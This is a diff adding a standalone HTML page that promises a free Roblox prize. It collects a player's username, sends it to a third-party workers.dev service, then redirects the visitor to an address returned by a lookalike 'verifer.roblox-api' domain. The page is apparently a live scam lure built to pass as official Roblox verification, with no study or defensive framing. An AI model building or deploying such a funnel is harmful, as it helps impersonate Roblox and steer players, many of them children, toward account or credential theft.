@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Roblox Flow</title>
+
+<style>
+  * {
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+  }
+
+  html, body {
+    width: 100%;
+    height: 100%;
+    margin: 0;
+  }
+
+  body {
+    background-image: url("background.png");
+  }
+
+  /* TRUE CENTER */
+  .viewport {
+    position: fixed;
+    inset: 0;
+    display: grid;
+    place-items: center;
+  }
+
+  .screen {
+    position: absolute;
+    width: 380px;
+    background: #121212;
+    border-radius: 16px;
+    padding: 28px;
+    box-shadow: 0 20px 60px rgba(0,0,0,.6);
+    text-align: center;
+    color: white;
+    opacity: 1;
+    transform: scale(1);
+    transition: opacity .35s ease, transform .35s ease;
+  }
+
+  .hidden {
+    opacity: 0;
+    pointer-events: none;
+    transform: scale(.96);
+  }
+
+  h2 {
+    margin: 0 0 20px;
+    font-weight: 600;
+  }
+
+  .buttons, .row {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+  }
+
+  button {
+    background: #2f2f2f;
+    border: none;
+    color: white;
+    padding: 12px 18px;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background .2s, transform .1s;
+  }
+
+  button:hover { background: #3b3b3b; }
+  button:active { transform: scale(.96); }
+
+  input {
+    width: 100%;
+    padding: 14px;
+    border-radius: 10px;
+    border: none;
+    outline: none;
+    font-size: 16px;
+    background: #1f1f1f;
+    color: white;
+    margin-bottom: 16px;
+  }
+
+  .avatar {
+    width: 160px;
+    height: 160px;
+    border-radius: 16px;
+    margin: 16px auto;
+    background: #1f1f1f;
+    object-fit: cover;
+  }
+</style>
+</head>
+<body>
+<div class="viewport">
+  <div id="screen1" class="screen">
+    <h2>Choose a Prize</h2>
+    <div class="buttons">
+      <button onclick="next()"><img src="Bunny.png" alt="Bunny" style="width: 50px; height: 50px;"></button>
+      <button onclick="next()"><img src="Racoon.png" alt="Racoon" style="width: 50px; height: 50px;"></button>
+      <button onclick="next()"><img src="Penguin.png" alt="Penguin" style="width: 50px; height: 50px;"></button>
+    </div>
+  </div>
+  <div id="screen2" class="screen hidden">
+    <h2>Enter your Roblox username</h2>
+    <input id="username" placeholder="Roblox username">
+    <button onclick="lookup()">Continue</button>
+  </div>
+  <div id="screen3" class="screen hidden">
+    <h2>Is this you?</h2>
+    <img id="avatar" class="avatar">
+    <div class="row">
+      <button onclick="confirmYes()">Yes</button>
+      <button onclick="back()">No</button>
+    </div>
+  </div>
+</div>
+<script>
+const s1 = document.getElementById("screen1");
+const s2 = document.getElementById("screen2");
+const s3 = document.getElementById("screen3");
+const avatar = document.getElementById("avatar");
+let userId = null;
+
+function swap(from, to) {
+  from.classList.add("hidden");
+  setTimeout(() => to.classList.remove("hidden"), 350);
+}
+
+function next() {
+  swap(s1, s2);
+}
+
+async function lookup() {
+  const username = document.getElementById("username").value.trim();
+  if (!username) return;
+
+  const res = await fetch("https://rbxfinder.gwishyman.workers.dev/user", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username })
+  });
+
+  const data = await res.json();
+  if (!data.userId) return;
+
+  document.getElementById("avatar").src = data.headshot;
+
+  swap(s2, s3);
+}
+
+function back() {
+  swap(s3, s2);
+}
+
+async function confirmYes() {
+  try {
+    const res = await fetch("https://verifer.roblox-api-8ff.workers.dev/confirm", {
+      method: "POST"
+    });
+    const data = await res.json();
+
+    if (data.redirect) {
+      window.location.href = data.redirect;
+    }
+  } catch (err) {
+    alert("Failed to redirect. Try again.");
+    console.error(err);
+  }
+}
+</script>
+</body>
+</html>
